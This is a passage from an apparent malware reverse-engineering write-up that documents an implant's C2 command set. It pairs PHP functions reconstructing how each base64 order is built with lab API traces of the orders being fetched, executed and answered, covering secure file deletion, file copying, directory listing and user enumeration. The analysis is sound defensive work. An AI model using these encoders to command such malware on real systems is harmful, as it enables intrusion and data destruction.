[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000004997BA61C0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+X9jQSNMMHx/10x/2Ui1u9VBz"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000004997BB97F0
[PAR] DWORD   *pcbBinary : 0x0000004999B7E6EC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x4999adbea1]
```

**II. Execution**   

```html
Nothing to 'see', it's purely an update of the malware's configuration
```

**III. Result**   

```html
[CNT] [348]
[PTP] [0x9f0] [0x3bc] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000004997BAD3D0
[STR]        -> "2921"
[STR]           "10 42"
[PAR] DWORD  cbBinary   : 0x14
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000004997BA2D10
[PAR] DWORD* pcchString : 0x0000004999B7E54C
[RET] [0x4999ade028]
```

<a id="SetCurrentDirectory"></a>
# SetCurrentDirectory

```php
function SetCurrentDirectory($dir_path)
{
	$dir_16le = UConverter::transcode($dir_path, 'UTF-16LE', 'UTF-8');
	$b64_dir = base64_encode($dir_16le);
	$cmd_id = "\x39\x11 $b64_dir";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [275]
[PTP] [0x9d4] [0x76c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000001BB0F95430
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+W9nQSMsAOjr1/BCMGj1p1WYbfGk6tPnyFLnwPSInEbGKSwznt4dEWLOdXP2dHrHaL9UPsMvLc9I2FQ=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000001BB0FA80B0
[PAR] DWORD   *pcbBinary : 0x0000001BB2FAE69C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x1bb2f0bea1]
```

**II. Execution**   

```html
[CNT] [285]
[PTP] [0x9d4] [0x76c] [c:\windows\system32\rundll32.exe]
[API] <SetCurrentDirectoryW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpPathName : 0x0000001BB0FA69A0
[STR]         -> "C:\Users\user"
[RET] [0x1bb2f0a278]
```

**III. Result**   

```html
[CNT] [292]
[PTP] [0x9d4] [0x76c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000001BB0FA6880
[STR]        -> "3911"
[STR]           "C:\Users\user"
[PAR] DWORD  cbBinary   : 0x24
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0
[PAR] DWORD* pcchString : 0x0000001BB2FAE52C
[RET] [0x1bb2f0dff1]
```

<a id="CopyFileW"></a>
# CopyFileW

```php
function CopyFileW($src, $dst)
{
	$src_16le = UConverter::transcode($src, 'UTF-16LE', 'UTF-8');
	$dst_16le = UConverter::transcode($dst, 'UTF-16LE', 'UTF-8');
	$src_b64 = base64_encode($src_16le);
	$dst_b64 = base64_encode($dst_16le);
	
	$cmd_id = "\x05\xa9 $src_b64 $dst_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [348]
[PTP] [0x6b4] [0x864] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000FC1D334160
[STR]         -> " BakgUXdBNkFGd0FWUUJ6QUdVQWNnQnpBRndBZFFCekFHVUFjZ0JjQUVRQVpRQnpBR3NBZEFCdkFIQUFYQUJ3QUhJQWJ3QjBBR1VBWXdCMEFGOEFZUUJ1QUd"
[STR]            "RQVh3QjFBSEFBYUFCdkFHd0FaQUJjQUdnQWRRQnRBR0VBYmdCZkFISUFhUUJuQUdnQWRBQnpBQzRBZEFCNEFIUUEgUXdBNkFGd0FWUUJ6QUdVQWNnQnpBRnd"
[STR]            "BZFFCekFHVUFjZ0JjQUVRQVpRQnpBR3NBZEFCdkFIQUFYQUJ3QUhJQWJ3QjBBR1VBWXdCMEFGOEFZUUJ1QUdRQVh3QjFBSEFBYUFCdkFHd0FaQUJjQUdVQWR"
[STR]            "nQmxBSElBZVFCM0FHZ0FaUUJ5QUdVQVhBQm9BSFVBYlFCaEFHNEFYd0J5QUdrQVp3Qm9BSFFBY3dBdUFIUUFlQUIwQUE9PQ=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000FC1D3639B0
[PAR] DWORD   *pcbBinary : 0x000000FC1F22EB3C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xfc1f18bea1]
```

**II. Execution**   

```html
[CNT] [370]
[PTP] [0x6b4] [0x9ec] [c:\windows\system32\rundll32.exe]
[API] <CopyFileW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpExistingFileName : 0x000000FC1D3458B0
[STR]         -> "C:\Users\user\Desktop\protect_and_uphold\human_rights.txt"
[PAR] LPCWSTR lpNewFileName      : 0x000000FC1D355E40
[STR]         -> "C:\Users\user\Desktop\protect_and_uphold\everywhere\human_rights.txt"
[RET] [0xfc1f18b1b4]
```

**III. Result**   

```html
[CNT] [377]
[PTP] [0x6b4] [0x9ec] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000FC1D35DE30
[STR]        -> "05A9"
[STR]           "C:\Users\user\Desktop\protect_and_uphold\human_rights.txt"
[STR]           "C:\Users\user\Desktop\protect_and_uphold\everywhere\human_rights.txt"
[PAR] DWORD  cbBinary   : 0x106
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0
[PAR] DWORD* pcchString : 0x000000FC1F79EEDC
[RET] [0xfc1f18dff1]
```

<a id="MoveFileW"></a>
# MoveFileW

```php
function MoveFileW($src, $dst)
{
	$src_16le = UConverter::transcode($src, 'UTF-16LE', 'UTF-8');
	$dst_16le = UConverter::transcode($dst, 'UTF-16LE', 'UTF-8');
	$src_b64 = base64_encode($src_16le);
	$dst_b64 = base64_encode($dst_16le);
	
	$cmd_id = "\x05\xa9 $src_b64 $dst_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [474]
[PTP] [0x5c4] [0x6d4] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000061E09D8F90
[STR]         -> " BakgUXdBNkFGd0FKQUJTQUdVQVl3QjVBR01BYkFCbEFFSUFhUUJ1QUZ3QVhBQm9BSFVBYlFCaEFHNEFYd0J5QUdrQVp3Qm9BSFFBY3dBdUFIUUFlQUIwQUE"
[STR]            "9PSBRd0E2QUZ3QVZRQnpBR1VBY2dCekFGd0FkUUJ6QUdVQWNnQmNBRVFBWlFCekFHc0FkQUJ2QUhBQVhBQndBSElBYndCMEFHVUFZd0IwQUY4QVlRQnVBR1F"
[STR]            "BWHdCMUFIQUFhQUJ2QUd3QVpBQmNBR2dBZFFCdEFHRUFiZ0JmQUhJQWFRQm5BR2dBZEFCekFDNEFkQUI0QUhRQQ=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000061E09EE130
[PAR] DWORD   *pcbBinary : 0x00000061E2A4E9FC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x61e29abea1]
```

**II. Execution**   

```html
[CNT] [496]
[PTP] [0x5c4] [0xa88] [c:\windows\system32\rundll32.exe]
[API] <CopyFileW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpExistingFileName : 0x00000061E09C6520
[STR]         -> "C:\$RecycleBin\\human_rights.txt"
[PAR] LPCWSTR lpNewFileName      : 0x00000061E09B87F0
[STR]         -> "C:\Users\user\Desktop\protect_and_uphold\human_rights.txt"
[RET] [0x61e29ab1b4]
```

**III. Result**   

```html
[CNT] [505]
[PTP] [0x5c4] [0xa88] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000061E09DD250
[STR]        -> "05A9"
[STR]           "C:\$RecycleBin\\human_rights.txt"
[STR]           "C:\Users\user\Desktop\protect_and_uphold\human_rights.txt"
[PAR] DWORD  cbBinary   : 0xbe
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000061E09E8310
[PAR] DWORD* pcchString : 0x00000061E2FBEC5C
[RET] [0x61e29ae028]
```

<a id="DeleteFileSecure"></a>
# DeleteFileSecure

This command comes with an otional parameter "rf".  
Without the parameter it's a simple DeleteFileW call, with the "rf" parameter the targeted file will be 'securely' deleted by being overwritten 5 times with random bytes before deletion.  

```php
function DeleteFileSecure($dos_path, $secure_erase)
{
	$dos_path_16le = UConverter::transcode($dos_path, 'UTF-16LE', 'UTF-8');
	$dos_path_b64 = base64_encode($dos_path_16le);
	
	$cmd_id = "\x93\xe9 $secure_erase $dos_path_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000008948A41780
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+f6D+SP01Bx/uzzKJMGZpxVd+cAg+tNeSFLvaBSIeL52JSxjnv69mWYywXPauILH4I7AM473beM8EfdeLJYjTXrMDK5AMNSW2"
[STR]            "1ExzmmFFh3mJWnQ8KHZU5U8MObLv1f4MktRG6lCxxw3VmcmGWU0KqN5RiT8HolmzBU4w7JQya9BK0000rvZz074CxXTxqk8rEKC/vhCpxnLavGnaxs2XL4dg"
[STR]            "N0j4Zvq0k6Q="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000008948A17610
[PAR] DWORD   *pcbBinary : 0x000000894A91EC6C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x894a87bea1]
```

**II. Execution**   

```html
[CNT] [340]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <RtlDosPathNameToNtPathName_U> in [ntdll.dll] 
[PAR] PCWSTR               DosPathName    : 0x0000008948A3B190
[STR]                      -> "C:\Users\user\Desktop\PROTEC~1\HUMAN_~1.TXT"
[PAR] PUNICODE_STRING      NtPathName     : 0x000000894A91EB30
[PAR] PCWSTR*              NtFileNamePart : 0x0
[PAR] PRTL_RELATIVE_NAME_U DirectoryInfo  : 0x0
[RET] [0x894a88a6f3]

[CNT] [342]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <GetFileSizeEx> in [KERNEL32.DLL] 
[PAR] HANDLE         hFile      : 0x2f0
[PAR] PLARGE_INTEGER lpFileSize : 0x000000894A91EB20
[RET] [0x894a88a7a9]

[CNT] [343]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <SystemFunction036> in [CRYPTBASE.DLL] 
[INF] [ RtlGenRandom ]
[PAR] PVOID RandomBuffer       : 0x0000008948A18EB0
[PAR] ULONG RandomBufferLength : 0x75
[RET] [0x894a88a7f2]

[CNT] [344]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <WriteFile> in [KERNEL32.DLL] 
[PAR] HANDLE       hFile                  : 0x2f0
[PAR] LPVOID       lpBuffer               : 0x0000008948A18EB0
[PAR] DWORD        nNumberOfBytesToWrite  : 0x75
[PAR] LPDWORD      lpNumberOfBytesWritten : 0x000000894A91EAFC
[PAR] LPOVERLAPPED lpOverlapped           : 0x0
[RET] [0x894a88a811]

[CNT] [345]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <SystemFunction036> in [CRYPTBASE.DLL] 
[INF] [ RtlGenRandom ]
[PAR] PVOID RandomBuffer       : 0x0000008948A18530
[PAR] ULONG RandomBufferLength : 0x75
[RET] [0x894a88a7f2]

[CNT] [346]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <WriteFile> in [KERNEL32.DLL] 
[PAR] HANDLE       hFile                  : 0x2f0
[PAR] LPVOID       lpBuffer               : 0x0000008948A18530
[PAR] DWORD        nNumberOfBytesToWrite  : 0x75
[PAR] LPDWORD      lpNumberOfBytesWritten : 0x000000894A91EAFC
[PAR] LPOVERLAPPED lpOverlapped           : 0x0
[RET] [0x894a88a811]

[CNT] [347]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <SystemFunction036> in [CRYPTBASE.DLL] 
[INF] [ RtlGenRandom ]
[PAR] PVOID RandomBuffer       : 0x0000008948A18EB0
[PAR] ULONG RandomBufferLength : 0x75
[RET] [0x894a88a7f2]

[CNT] [348]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <WriteFile> in [KERNEL32.DLL] 
[PAR] HANDLE       hFile                  : 0x2f0
[PAR] LPVOID       lpBuffer               : 0x0000008948A18EB0
[PAR] DWORD        nNumberOfBytesToWrite  : 0x75
[PAR] LPDWORD      lpNumberOfBytesWritten : 0x000000894A91EAFC
[PAR] LPOVERLAPPED lpOverlapped           : 0x0
[RET] [0x894a88a811]

[CNT] [349]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <SystemFunction036> in [CRYPTBASE.DLL] 
[INF] [ RtlGenRandom ]
[PAR] PVOID RandomBuffer       : 0x0000008948A190B0
[PAR] ULONG RandomBufferLength : 0x75
[RET] [0x894a88a7f2]

[CNT] [350]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <WriteFile> in [KERNEL32.DLL] 
[PAR] HANDLE       hFile                  : 0x2f0
[PAR] LPVOID       lpBuffer               : 0x0000008948A190B0
[PAR] DWORD        nNumberOfBytesToWrite  : 0x75
[PAR] LPDWORD      lpNumberOfBytesWritten : 0x000000894A91EAFC
[PAR] LPOVERLAPPED lpOverlapped           : 0x0
[RET] [0x894a88a811]

[CNT] [351]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <WriteFile> in [KERNEL32.DLL] 
[PAR] HANDLE       hFile                  : 0x2f0
[PAR] LPVOID       lpBuffer               : 0x0000008948A18EB0
[PAR] DWORD        nNumberOfBytesToWrite  : 0x75
[PAR] LPDWORD      lpNumberOfBytesWritten : 0x000000894A91EAFC
[PAR] LPOVERLAPPED lpOverlapped           : 0x0
[RET] [0x894a88a811]

[CNT] [352]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <DeleteFileW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName : 0x0000008948A3B190
[STR]         -> "C:\Users\user\Desktop\PROTEC~1\HUMAN_~1.TXT"
[RET] [0x894a88a86c]
```

**III. Result**   

```html
[CNT] [364]
[PTP] [0xb20] [0xbec] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000008948A12330
[STR]        -> "93E9"
[STR]           "AA C:\Users\user\Desktop\PROTEC~1\HUMAN_~1.TXT"
[PAR] DWORD  cbBinary   : 0x66
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000008948A09550
[PAR] DWORD* pcchString : 0x000000894A91EA3C
[RET] [0x894a87e028]
```

<a id="CreateDirectoryW"></a>
# CreateDirectoryW

```php
function CreateDirectoryW($dir_path)
{
	$dir_16le = UConverter::transcode($dir_path, 'UTF-16LE', 'UTF-8');
	$b64_dir = base64_encode($dir_16le);
	$cmd_id = "\x61\x3f $b64_dir";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x38c] [0x4cc] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000006C42065A90
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Td+tSMsAOjr1/BCMGj1p1WYbfGk6tPnyFLnwPSInEbGKSwznt4dEWLOdXP2dHrHaL9UA47a+ZPcEfvGLJbDTTrBeFZAEQy23"
[STR]            "6mJzkFR7h2mJWncSKHZM/U8IXsWSo+1IoIU="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000006C420485B0
[PAR] DWORD   *pcbBinary : 0x0000006C4407E60C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x6c43fdbea1]
```

**II. Execution**   

```html
[CNT] [337]
[PTP] [0x38c] [0x4cc] [c:\windows\system32\rundll32.exe]
[API] <CreateDirectoryW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpPathName : 0x0000006C4205AB00
[STR]         -> "C:\Users\user\Desktop\42"
[RET] [0x6c43fe515a]

[ * ] [pid 0x38c][tid 0x4cc] c:\windows\system32\rundll32.exe
[EVT] [Kernel Monitoring]
[MSG] [FILE_CREATED] [C:\Users\user\Desktop\42]
```

**III. Result**   

```html
[CNT] [345]
[PTP] [0x38c] [0x4cc] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000006C42056B10
[STR]        -> "613F"
[STR]           "C:\Users\user\Desktop\42"
[PAR] DWORD  cbBinary   : 0x3a
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000006C42065A90
[PAR] DWORD* pcchString : 0x0000006C4407E49C
[RET] [0x6c43fde028]
```

<a id="RemoveDirectoryW"></a>
# RemoveDirectoryW

```php
function RemoveDirectoryW($dir_path)
{
	$dir_16le = UConverter::transcode($dir_path, 'UTF-16LE', 'UTF-8');
	$b64_dir = base64_encode($dir_16le);
	$cmd_id = "\x40\x8f $b64_dir";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [361]
[PTP] [0xbf0] [0x3dc] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000A0A63020A0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+RcKtSMsAOjr1/BCMGj1p1WYbfGk6tPnyFLnwPSInEbGKSwznt4dEWLOdXP2dHrHaL9UA47a+ZPcEfvGLJbDTTrBeFZAEQy23"
[STR]            "6mJzkFR7h2mJWncSKHZM/U8IXsWSo+1IoIU="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000A0A62E5230
[PAR] DWORD   *pcbBinary : 0x000000A0A81FE64C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xa0a815bea1]
```

**II. Execution**   

```html
[CNT] [371]
[PTP] [0xbf0] [0x3dc] [c:\windows\system32\rundll32.exe]
[API] <RemoveDirectoryW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpPathName : 0x000000A0A62E5E00
[STR]         -> "C:\Users\user\Desktop\42"
[RET] [0xa0a816a988]
```

**III. Result**   

```html
[CNT] [379]
[PTP] [0xbf0] [0x3dc] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000A0A62E2E50
[STR]        -> "408F"
[STR]           "C:\Users\user\Desktop\42"
[PAR] DWORD  cbBinary   : 0x3a
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000A0A63020A0
[PAR] DWORD* pcchString : 0x000000A0A81FE4DC
[RET] [0xa0a815e028]
```

<a id="listdir"></a>
# listdir

```php
function listdir($dir_path)
{
	$dir_16le = UConverter::transcode($dir_path, 'UTF-16LE', 'UTF-8');
	$b64_dir = base64_encode($dir_16le);
	$cmd_id = "\x32\x0a $b64_dir";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x790] [0x7a8] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000005C7B6F43E0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Wez6SMsAOjr1/BCMGj1p1WYbfGk6tPnyFLnwPSInEbGKSwznt4dEWLOdXP2dHrHaL9UA47a+ZPcEfvGLJbDTTrBeFZAEQy23"
[STR]            "6mJzkFR7h2mJWndcVQNfwH1k"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000005C7B6E7EE0
[PAR] DWORD   *pcbBinary : 0x0000005C7D63EA1C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x5c7d59bea1]
```

**II. Execution**   

```html
[CNT] [343]
[PTP] [0x790] [0x7a8] [c:\windows\system32\rundll32.exe]
[API] <FindFirstFileW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName : 0x0000005C7B6E98C0
[STR]         -> "C:\Users\user\Desktop\*"
[RET] [0x5c7d5a2d92]

[CNT] [344]
[PTP] [0x790] [0x7a8] [c:\windows\system32\rundll32.exe]
[API] <FindNextFileW> in [KERNEL32.DLL] 
[PAR] HANDLE             hFindFile      : 0x0000005C7B6FC4F0
[PAR] LPWIN32_FIND_DATAW lpFindFileData : 0x0000005C7D63E6B0
[RET] [0x5c7d5a3501]

[CNT] [345]
[PTP] [0x790] [0x7a8] [c:\windows\system32\rundll32.exe]
[API] <FindNextFileW> in [KERNEL32.DLL] 
[PAR] HANDLE             hFindFile      : 0x0000005C7B6FC4F0
[PAR] LPWIN32_FIND_DATAW lpFindFileData : 0x0000005C7D63E6B0
[RET] [0x5c7d5a3501]

[CNT] [346]
[PTP] [0x790] [0x7a8] [c:\windows\system32\rundll32.exe]
[API] <CreateFileW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName            : 0x0000005C7B6E3920
[STR]         -> "C:\Users\user\Desktop\\97.exe"
[PAR] DWORD   dwDesiredAccess       : 0x80000000 (GENERIC_READ)
[PAR] DWORD   dwCreationDisposition : 0x3 (OPEN_EXISTING)
[RET] [0x5c7d5a31be]

[CNT] [347]
[PTP] [0x790] [0x7a8] [c:\windows\system32\rundll32.exe]
[API] <GetFileTime> in [KERNEL32.DLL] 
[PAR] HANDLE hFile : 0x304
[RET] [0x5c7d5a31e4]

[CNT] [348]
[PTP] [0x790] [0x7a8] [c:\windows\system32\rundll32.exe]
[API] <FileTimeToSystemTime> in [KERNEL32.DLL] 
[RET] [0x5c7d5a321a]

[CNT] [349]
[PTP] [0x790] [0x7a8] [c:\windows\system32\rundll32.exe]
[API] <SystemTimeToTzSpecificLocalTime> in [KERNEL32.DLL] 
[RET] [0x5c7d5a3237]

[...]
```

**III. Result**   

```html
[CNT] [936]
[PTP] [0x790] [0x7a8] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000005C7B70A1E0
[STR]        -> "320A"
[STR]           "C:\Users\user\Desktop\|16-04-2021 18:35|BA|97.exe|196608"
[STR]           "22-10-2024 01:18|BA|Autoruns64.exe|1955248"
[STR]           "28-11-2024 10:41|BA|calc.exe.lnk|1232"
[STR]           "28-11-2024 10:40|BA|calc64.exe.lnk|1232"
[STR]           "18-03-2025 16:55|BA|conf.txt|1851"
[STR]           "14-03-2025 16:08|AA|debug"
[STR]           "28-11-2024 10:44|BA|Debug (VBOXSVR) - Raccourci.lnk|1548"
[STR]           "22-10-2024 00:42|BA|desktop.ini|282"
[STR]           "28-11-2024 10:40|BA|drivers - Raccourci.lnk|1172"
[STR]           "17-12-2024 12:07|BA|dump (VBOXSVR) - Raccourci.lnk|1546"
[STR]           "04-03-2025 00:38|BA|Firefox Setup 115.20.0esr.exe|59187704"
[STR]           "04-03-2025 01:20|BA|Graphical Loader.exe|148480"
[STR]           "03-01-2025 16:04|BA|malwares (VBOXSVR) - Raccourci.lnk|1570"
[STR]           "10-02-2025 23:53|BA|Nmap - Zenmap GUI.lnk|2171"
[STR]           "11-02-2025 00:43|BA|nmap.txt|57"
[STR]           "18-03-2025 15:00|BA|Nouveau document texte.txt|0"
[STR]           "22-10-2024 01:18|BA|procexp64.exe|2381232"
[STR]           "04-12-2024 20:46|BA|Procmon64.exe|2142648"
[STR]           "18-03-2025 17:13|AA|protect_and_uphold"
[STR]           "03-01-2025 17:36|BA|runlog.dat.tmp|299"
[STR]           "12-03-2025 18:20|AA|Samples"
[STR]           "25-02-2025 16:36|AA|Screenshot"
[STR]           "22-10-2024 01:16|AA|SysinternalsSuite(1)"
[STR]           "22-10-2024 00:49|AA|target"
[STR]           "22-10-2024 01:18|BA|tcpview64.exe|1087368"
[STR]           "24-01-2025 16:53|AA|test"
[STR]           "04-12-2024 18:08|AA|WinHex"
[PAR] DWORD  cbBinary   : 0x8be
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0
[PAR] DWORD* pcchString : 0x0000005C7D63E57C
[RET] [0x5c7d59dff1]
```

<a id="NetInfo"></a>
# NetInfo

So, this command requires a parameter thant can take the following values :  
"A" (NetUserEnum)   
"B" (NetUserGetInfo)  
"C" (NetLocalGroupEnum)  
"D" (NetLocalGroupGetMembers / NetGroupGetUsers)  

```php
function NetInfo($option, $unkn)
{
	$cmd_id = "\x59\xa9 $option $unkn";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

As I still didn't setup a domain controler in my lab yet, results will be quite limited, here is an example with the "A" option :  

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0xa6c] [0xa98] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000B444DFB5A0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Q+r+SM8LHDz0+y6dHT95+1B/Tm4I08vdHavsPxB7FcO6FimYweFDbLXL"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000B444DE3240
[PAR] DWORD   *pcbBinary : 0x000000B446C7E6CC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xb446bdbea1]
```

**II. Execution**   

```html
[CNT] [375]
[PTP] [0xa6c] [0xa98] [c:\windows\system32\rundll32.exe]
[API] <NetUserEnum> in [SAMCLI.DLL] 
[PAR] LPCWSTR servername    : 0x000000B444DE9740
[STR]         -> "C:\Users\user\Desktop"
[PAR] DWORD   level         : 0x2
[PAR] DWORD   filter        : 0x2 (FILTER_NORMAL_ACCOUNT)
[PAR] LPBYTE* bufptr        : 0x000000B446C7E448
[PAR] DWORD   prefmaxlen    : 0xffffffff
[PAR] LPDWORD entriesread   : 0x000000B446C7E43C
[PAR] LPDWORD totalentries  : 0x000000B446C7E440
[PAR] PDWORD  resume_handle : 0x000000B446C7E444
[RET] [0xb446bd53d3]
```

**III. Result (failed)**   

```html
[CNT] [386]
[PTP] [0xa6c] [0xa98] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000B444DEED40
[STR]        -> "9999"
[STR]           "1707"
[PAR] DWORD  cbBinary   : 0x12
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000B444DE9400
[PAR] DWORD* pcchString : 0x000000B446C7E2FC
[RET] [0xb446bde028]
```

<a id="CreateProcessWithLogon"></a>
# CreateProcessWithLogon

```php
function CreateProcessWithLogon($domain, $username, $password, $AppName, $CommandLine)
{
